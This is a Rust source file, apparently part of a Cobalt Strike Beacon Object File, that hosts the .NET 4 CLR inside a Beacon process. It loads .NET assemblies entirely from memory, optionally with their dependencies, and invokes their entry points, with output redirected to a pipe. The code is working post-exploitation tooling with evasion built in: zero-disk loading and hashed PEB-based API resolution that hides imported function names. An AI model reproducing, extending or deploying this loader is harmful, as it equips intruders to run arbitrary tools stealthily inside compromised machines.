//! .NET Framework 4.x path.
//!
//! Two modes:
//!
//! - **Single-file** (`run`): `AppDomain.Load_3(byte[])` + `MethodInfo.Invoke_3`.
//!   Zero-disk. Works for non-merged .NET Framework binaries.
//!
//! - **Multi-file** (`run_multi`): operator passes a directory. CNA bundles all
//!   `.dll`/`.exe` files. BOF pre-loads each dependency `.dll` via `Load_3`
//!   (keeping the `ComPtr<Assembly>` alive so the dep isn't evicted from the
//!   AppDomain), then loads the main `.exe`, then invokes its entry point.
//!
//! **Known limitations** (CLR-side, not BOF bugs):
//! - Costura.Fody-merged binaries fail `Load_3` with `ERROR_BAD_FORMAT` —
//!   the CLR's metadata validator rejects Costura-mangled bundles.
//! - Tools with native dependencies (`.dll` loaded via P/Invoke from disk)
//!   can't be supported via in-memory load alone.

use crate::error::OrchestratorError as BofError;
use crate::pe_parser::AsmInfo;
use alloc::format;
use alloc::string::String;
use alloc::vec::Vec;
use core::ffi::c_void;
use opsec_com::appdomain::{AppDomain, Assembly, MethodInfo};
use opsec_com::bstr::OwnedBstr;
use opsec_com::clr::{ICorRuntimeHost, start_clr};
use opsec_com::comptr::{ComPtr, IUnknown};
use opsec_com::guids::IID_APP_DOMAIN;
use opsec_com::safearray::{OwnedSafeArray, SafeArray, VT_BSTR, VT_UI1, VT_VARIANT};
use opsec_com::variant::Variant;

const V4_VERSION: &[u16] = &[
    b'v' as u16, b'4' as u16, b'.' as u16, b'0' as u16, b'.' as u16,
    b'3' as u16, b'0' as u16, b'3' as u16, b'1' as u16, b'9' as u16, 0,
];

unsafe fn stop_clr(host: &ComPtr<ICorRuntimeHost>) {
    unsafe {
        let h = host.as_raw();
        let hr = ((*(*h).vtbl).stop)(h as *mut c_void);
        #[cfg(feature = "debug-io")]
        rustbof::eprintln!("[dbg] clr stop hr={:#010x}", hr as u32);
        #[cfg(not(feature = "debug-io"))]
        let _ = hr;
    }
}

/// NetFx4 orchestrator (single-file): byte[] load + invoke.
#[allow(clippy::too_many_arguments)]
pub unsafe fn run(
    info: &AsmInfo,
    asm_bytes: &[u8],
    app_domain: &str,
    asm_args: &str,
    entry_point_flag: u32,
    pipe_handle: usize,
) -> Result<(), BofError> {
    unsafe {
        let host = start(info)?;
        let domain = create_domain(&host, app_domain)?;
        // Bypass STD_OUTPUT_HANDLE entirely (which is 0 in Beacon's host
        // process). Pass the raw pipe write handle to FlushHelper as a hex
        // string; FlushHelper builds a FileStream directly from it and
        // replaces Console.Out/Error.  This is the ONLY path that survives
        // Beacon hosts that ignore SetStdHandle.
        let handle_hex = format!("{:x}", pipe_handle);
        crate::flush::do_flush(&domain, "pre", &handle_hex);
        crate::nlog::do_nlog_config(&domain);
        let assembly = load_assembly(&domain, asm_bytes)?;
        let result = invoke(&assembly, asm_args, entry_point_flag);
        // Post-flush: re-arm Console.Out/Error in case the user assembly
        // replaced them, and ensure any remaining buffered data is written
        // before drain() closes the pipe write end.
        crate::flush::do_flush(&domain, "post", &handle_hex);
        // Stop the CLR execution engine so background managed threads cannot
        // call ExitProcess after this BOF returns control to Beacon.
        stop_clr(&host);
        result
    }
}

/// NetFx4 orchestrator (multi-file): pre-load deps then load main + invoke.
#[allow(clippy::too_many_arguments)]
pub unsafe fn run_multi(
    info: &AsmInfo,
    files: &[(String, Vec<u8>)],
    main_name: &str,
    app_domain: &str,
    asm_args: &str,
    entry_point_flag: u32,
    pipe_handle: usize,
) -> Result<(), BofError> {
    unsafe {
        let host = start(info)?;
        let domain = create_domain(&host, app_domain)?;
        let handle_hex = format!("{:x}", pipe_handle);
        crate::flush::do_flush(&domain, "pre", &handle_hex);
        crate::nlog::do_nlog_config(&domain);

        // Keep ComPtr<Assembly> values alive in a Vec — calling Release on
        // them too early can evict the managed Assembly from the AppDomain
        // before the main assembly resolves its references.
        let mut _deps: Vec<ComPtr<Assembly>> = Vec::new();
        for (name, bytes) in files {
            if name.as_str() == main_name {
                continue;
            }
            if let Ok(dep) = load_assembly(&domain, bytes) {
                _deps.push(dep);
            }
        }

        let main_bytes = files
            .iter()
            .find(|(n, _)| n.as_str() == main_name)
            .map(|(_, b)| b.as_slice())
            .ok_or(BofError::Clr { hr: -1, op: "mNoMain" })?;
        let assembly = load_assembly(&domain, main_bytes)?;
        let result = invoke(&assembly, asm_args, entry_point_flag);
        crate::flush::do_flush(&domain, "post", &handle_hex);
        stop_clr(&host);
        result
    }
}

/// Parse the multi-file blob into (name, body) pairs.
/// Layout: `[n: u32 LE]` then `n × ([name_len: u32] [name UTF-8] [body_len: u32] [body])`.
pub fn parse_multi_blob(blob: &[u8]) -> Result<Vec<(String, Vec<u8>)>, BofError> {
    if blob.len() < 4 {
        return Err(BofError::Clr { hr: -1, op: "mTrunc" });
    }
    let n = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]) as usize;
    let mut off = 4usize;
    let mut out = Vec::with_capacity(n);
    for _ in 0..n {
        if off + 4 > blob.len() {
            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
        }
        let name_len = u32::from_le_bytes([
            blob[off], blob[off + 1], blob[off + 2], blob[off + 3],
        ]) as usize;
        off += 4;
        if off + name_len > blob.len() {
            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
        }
        let name = String::from_utf8(blob[off..off + name_len].to_vec())
            .map_err(|_| BofError::Clr { hr: -1, op: "mUtf8" })?;
        off += name_len;
        if off + 4 > blob.len() {
            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
        }
        let body_len = u32::from_le_bytes([
            blob[off], blob[off + 1], blob[off + 2], blob[off + 3],
        ]) as usize;
        off += 4;
        if off + body_len > blob.len() {
            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
        }
        let body = blob[off..off + body_len].to_vec();
        off += body_len;
        out.push((name, body));
    }
    Ok(out)
}

unsafe fn start(_info: &AsmInfo) -> Result<ComPtr<ICorRuntimeHost>, BofError> {
    unsafe { start_clr(V4_VERSION).map_err(|hr| BofError::Clr { hr, op: "c1" }) }
}

unsafe fn create_domain(
    host: &ComPtr<ICorRuntimeHost>,
    name: &str,
) -> Result<ComPtr<AppDomain>, BofError> {
    unsafe {
        let mut wname: Vec<u16> = name.encode_utf16().collect();
        wname.push(0);
        let mut domain_unk: *mut c_void = core::ptr::null_mut();
        let h = host.as_raw();
        let hr = ((*(*h).vtbl).create_domain)(
            h as *mut c_void,
            wname.as_ptr(),
            core::ptr::null_mut(),
            &mut domain_unk,
        );
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c2" });
        }
        let mut domain: *mut c_void = core::ptr::null_mut();
        let unk = domain_unk as *mut IUnknown;
        let hr = ((*(*unk).vtbl).query_interface)(
            unk as *mut c_void,
            &IID_APP_DOMAIN,
            &mut domain,
        );
        // Do not release the thunk on success — the CLR marshaler/proxy must
        // stay alive for the AppDomain to remain valid through Load_3.
        if hr < 0 {
            ((*(*unk).vtbl).release)(unk as *mut c_void);
            return Err(BofError::Clr { hr, op: "c3" });
        }
        ComPtr::<AppDomain>::from_raw(domain as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "c4" })
    }
}

pub(crate) unsafe fn load_assembly(
    domain: &ComPtr<AppDomain>,
    asm: &[u8],
) -> Result<ComPtr<Assembly>, BofError> {
    unsafe {
        let sa = OwnedSafeArray::create(VT_UI1, asm.len() as u32)
            .ok_or(BofError::Clr { hr: -1, op: "c5" })?;
        if !sa.copy_from(asm) {
            return Err(BofError::Clr { hr: -1, op: "c5b" });
        }
        let d = domain.as_raw();
        let mut asm_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*d).vtbl).load_3)(d as *mut c_void, sa.ptr, &mut asm_ptr);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "c6" });
        }
        ComPtr::<Assembly>::from_raw(asm_ptr as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "c7" })
    }
}

pub(crate) unsafe fn invoke(
    asm: &ComPtr<Assembly>,
    args_str: &str,
    _entry_point: u32,
) -> Result<(), BofError> {
    unsafe {
        let a = asm.as_raw();
        let mut mi_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*a).vtbl).entry_point)(a as *mut c_void, &mut mi_ptr);
        if hr < 0 || mi_ptr.is_null() {
            return Err(BofError::Clr { hr, op: "c8" });
        }
        let mi = mi_ptr as *mut MethodInfo;

        let tokens: Vec<&str> = args_str.split_whitespace().collect();
        let args_sa = OwnedSafeArray::create(VT_VARIANT, 1)
            .ok_or(BofError::Clr { hr: -1, op: "c9" })?;
        let bstr_array = OwnedSafeArray::create(VT_BSTR, tokens.len() as u32)
            .ok_or(BofError::Clr { hr: -1, op: "cA" })?;

        if let Some(oleaut) =
            opsec_peb::resolve_module(opsec_strcrypt::hash!("oleaut32.dll"))
        {
            if let Some(put) = opsec_peb::resolve_export(
                oleaut,
                opsec_strcrypt::hash!("SafeArrayPutElement"),
            ) {
                type PutFn = unsafe extern "system" fn(
                    *mut SafeArray,
                    *const i32,
                    *mut c_void,
                ) -> i32;
                let put_f: PutFn = core::mem::transmute(put);
                for (i, t) in tokens.iter().enumerate() {
                    let wide: Vec<u16> = t.encode_utf16().collect();
                    if let Some(bstr) = OwnedBstr::from_utf16(&wide) {
                        let idx = i as i32;
                        put_f(bstr_array.ptr, &idx, bstr.s as *mut c_void);
                        core::mem::forget(bstr);
                    }
                }
                let mut wrapper: Variant = core::mem::zeroed();
                wrapper.vt = 0x2008u16;
                wrapper.payload[0] = bstr_array.ptr as u64;
                let idx: i32 = 0;
                put_f(
                    args_sa.ptr,
                    &idx,
                    &mut wrapper as *mut Variant as *mut c_void,
                );
                core::mem::forget(bstr_array);
            }
        }

        let mut retval: Variant = core::mem::zeroed();
        let obj: Variant = core::mem::zeroed();
        let hr = ((*(*mi).vtbl).invoke_3)(mi as *mut c_void, obj, args_sa.ptr, &mut retval);
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "cB" });
        }
        Ok(())
    }
}
